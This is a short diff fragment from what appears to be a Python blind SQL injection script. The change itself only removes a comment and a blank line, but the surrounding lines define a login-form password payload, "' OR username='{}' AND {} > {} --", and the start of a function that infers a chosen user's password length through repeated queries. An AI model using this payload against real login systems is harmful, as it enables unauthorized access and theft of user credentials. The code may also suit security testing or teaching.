@@ -16,8 +16,6 @@ wantedUser = sys.argv[1]
 #
 data_def = dict(username='anything',
                 password="' OR username='{}' AND {} > {} --")
-#
-
 
 def getPasswordLength(user, minlen=0, maxlen=50, nbreq=0):
     pass_tmpl = data_def['password'].format(user, 'LENGTH(password)', '{}')
